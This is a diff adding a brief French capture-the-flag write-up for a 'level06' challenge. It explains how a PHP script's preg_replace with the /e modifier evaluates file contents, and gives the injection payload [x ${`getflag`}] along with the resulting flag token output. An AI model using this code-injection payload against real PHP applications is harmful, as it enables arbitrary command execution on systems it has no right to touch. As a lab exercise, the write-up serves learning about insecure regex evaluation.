@@ -1,0 +1,23 @@
+
+A 1ere vue il faut executer le script php avec level06, il prend en argument un nom de fichier et le regex fait le reste
+
+1er regex : 
+
+	$a = file_get_contents($y); // lit le contenue du fichier
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); // prend le second groupe du regex -> [x >celui-la<] et le fout dans 
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+
+	Et puis remplace les crochets par parentheses
+
+	Donc dans le fichier on met : 
+	[x ${`getflag`}]
+	qui sera transformé en y(getflag)
+	enfin la fonction y sert pas a grand chose mais ensuite ca sera filtré pour bien executer la commande
+
+	
+
+	On quand on le lance dessus on a : 
+
+	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
